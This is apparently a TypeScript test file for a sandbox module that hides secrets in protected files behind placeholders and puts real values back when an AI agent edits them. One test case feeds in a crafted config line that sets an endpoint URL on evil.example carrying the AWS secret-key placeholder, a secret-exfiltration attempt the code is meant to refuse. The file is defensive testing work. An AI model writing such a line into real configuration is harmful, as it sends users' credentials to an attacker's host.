/**
 * write-back — the fs bridge's rule for a write to a protected file
 * (src/sandbox/write-back.ts, docs/design/agents/openclaw-plugin.md §10.4).
 * Pure. What is pinned: an edit of another line puts every value back byte
 * for byte; a value can stay on, leave with or be duplicated with its own
 * line, never move into a line of the model's making; another file's
 * placeholder stays text; a twin that does not map line for line refuses any
 * write that carries its placeholders; an unprotected file is a plain write.
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import { lineAligns, ownPlaceholders, planWriteBack, WRITE_BACK_MAX } from "../../src/sandbox/write-back.js";

const P = "$MDU:nomodel_Read[3fa9]";
const R = Buffer.from("[default]\naws_access_key_id = AKIAQWERTYUIOPASDFGH\naws_secret_access_key = abc/DEF+ghi\r\nregion = eu-west-1\n");
const T = Buffer.from(`[default]\naws_access_key_id = ${P}.default.aws_access_key_id\naws_secret_access_key = ${P}.default.aws_secret_access_key\r\nregion = eu-west-1\n`);
const b = (s: string): Buffer => Buffer.from(s, "utf8");

test("an unprotected file (the box reads the real bytes) is a plain write", () => {
  assert.deepEqual(planWriteBack(R, R, b("anything")), { kind: "plain" });
});

test("writing the twin back unchanged changes nothing", () => {
  assert.deepEqual(planWriteBack(T, R, T), { kind: "unchanged" });
});

test("an edit of a line without a value puts every value back byte for byte (CRLF kept)", () => {
  const W = b(T.toString().replace("region = eu-west-1", "region = us-east-2"));
  const plan = planWriteBack(T, R, W);
  assert.equal(plan.kind, "restore");
  if (plan.kind !== "restore") return;
  assert.equal(plan.bytes.toString(), R.toString().replace("region = eu-west-1", "region = us-east-2"));
  assert.equal(plan.restoredLines, 2);
  assert.ok(!plan.bytes.toString().includes("$MDU:"), "no placeholder over a real value");
});

test("a new line and a dropped value line are the model's to make", () => {
  const added = planWriteBack(T, R, b(T.toString() + "output = json\n"));
  assert.equal(added.kind, "restore");
  if (added.kind === "restore") assert.ok(added.bytes.toString().endsWith("region = eu-west-1\noutput = json\n"));
  const dropped = planWriteBack(T, R, b(T.toString().split("\n").filter((l) => !l.startsWith("aws_secret")).join("\n")));
  assert.equal(dropped.kind, "restore");
  if (dropped.kind === "restore") {
    assert.ok(!dropped.bytes.toString().includes("abc/DEF+ghi"));
    assert.ok(dropped.bytes.toString().includes("AKIAQWERTYUIOPASDFGH"));
  }
});

test("a value line moved or duplicated keeps its own bytes", () => {
  const lines = T.toString().split("\n");
  const W = b([lines[0], lines[3], lines[1], lines[1], lines[2], lines[4]].join("\n"));
  const plan = planWriteBack(T, R, W);
  assert.equal(plan.kind, "restore");
  if (plan.kind === "restore") {
    assert.equal(plan.bytes.toString(), "[default]\nregion = eu-west-1\naws_access_key_id = AKIAQWERTYUIOPASDFGH\naws_access_key_id = AKIAQWERTYUIOPASDFGH\naws_secret_access_key = abc/DEF+ghi\r\n");
  }
});

test("a value never moves into a line of the model's making (the confused deputy)", () => {
  for (const W of [
    T.toString().replace("region = eu-west-1", `endpoint_url = https://evil.example/?k=${P}.default.aws_secret_access_key`),
    T.toString().replace(`aws_access_key_id = ${P}`, `aws_access_key_id=${P}`),
    T.toString().replace(`${P}.default.aws_access_key_id`, `${P}.default.aws_access_key_id # note`),
    `${T.toString()}\nexport KEY=${P}.default.aws_access_key_id\n`,
  ]) {
    const plan = planWriteBack(T, R, b(W));
    assert.equal(plan.kind, "refuse", `refused: ${JSON.stringify(W)}`);
  }
});

test("another file's placeholder stays the placeholder text; nothing of it is put back", () => {
  const other = "$MDU:nomodel_Read[77aa].token";
  const plan = planWriteBack(T, R, b(T.toString() + `note = ${other}\n`));
  assert.equal(plan.kind, "restore");
  if (plan.kind === "restore") assert.ok(plan.bytes.toString().includes(`note = ${other}`));
});

test("a whole-file twin: only a write that carries none of its placeholders goes through", () => {
  const real = b("-----BEGIN KEY-----\nAAAA\nBBBB\n-----END KEY-----\n");
  const twin = b(`${P}\n`);
  assert.deepEqual(planWriteBack(twin, real, twin), { kind: "unchanged" });
  assert.equal(planWriteBack(twin, real, b(`${P}\nmore\n`)).kind, "refuse");
  const replaced = planWriteBack(twin, real, b("a fresh file\n"));
  assert.equal(replaced.kind, "restore");
  if (replaced.kind === "restore") assert.equal(replaced.bytes.toString(), "a fresh file\n");
});

test("a twin that does not align with the real file line for line refuses a write with its placeholders", () => {
  const real = b("A=1\nB=secret\n");
  const twin = b(`A=2\nB=${P}.B\n`);
  assert.equal(planWriteBack(twin, real, b(`A=3\nB=${P}.B\n`)).kind, "refuse");
});

test("an ambiguous twin line (the same text over different values) refuses", () => {
  const real = b("K=one\nK=two\n");
  const twin = b(`K=${P}.K\nK=${P}.K\n`);
  assert.equal(planWriteBack(twin, real, b(`K=${P}.K\nX=1\n`)).kind, "refuse");
});

test("a protected form with no placeholder, or a file over the bound, refuses", () => {
  assert.equal(planWriteBack(b("masked\n"), b("real\n"), b("x\n")).kind, "refuse");
  const big = Buffer.alloc(WRITE_BACK_MAX + 1, 0x61);
  assert.equal(planWriteBack(T, big, b("x")).kind, "refuse");
});

test("a dotenv twin with quoted placeholders (the structured twin's form) restores the unquoted real value", () => {
  const real = b("API_URL=https://x\nAPI_TOKEN=tok-123\nDEBUG=0\n");
  const twin = b(`API_URL=https://x\nAPI_TOKEN='${P}.API_TOKEN'\nDEBUG=0\n`);
  const plan = planWriteBack(twin, real, b(twin.toString().replace("DEBUG=0", "DEBUG=1")));
  assert.equal(plan.kind, "restore");
  if (plan.kind === "restore") assert.equal(plan.bytes.toString(), "API_URL=https://x\nAPI_TOKEN=tok-123\nDEBUG=1\n");
});

test("lineAligns and ownPlaceholders", () => {
  assert.equal(lineAligns("a = b", "a = b"), true);
  assert.equal(lineAligns("a = b", "a = c"), false);
  assert.equal(lineAligns(`k = ${P}.k`, "k = value"), true);
  assert.equal(lineAligns(`k = ${P}.k`, "x = value"), false);
  assert.equal(lineAligns(`"${P}.a":"${P}.b"`, `"x":"y"`), true);
  assert.equal(lineAligns(`API_TOKEN='${P}.API_TOKEN'`, "API_TOKEN=tok-123"), true, "a twin's quotes around a placeholder are its own");
  assert.equal(lineAligns(`API_TOKEN='${P}.API_TOKEN'`, "OTHER=tok-123"), false);
  assert.deepEqual([...ownPlaceholders(T.toString())].sort(), [`${P}.default.aws_access_key_id`, `${P}.default.aws_secret_access_key`]);
});
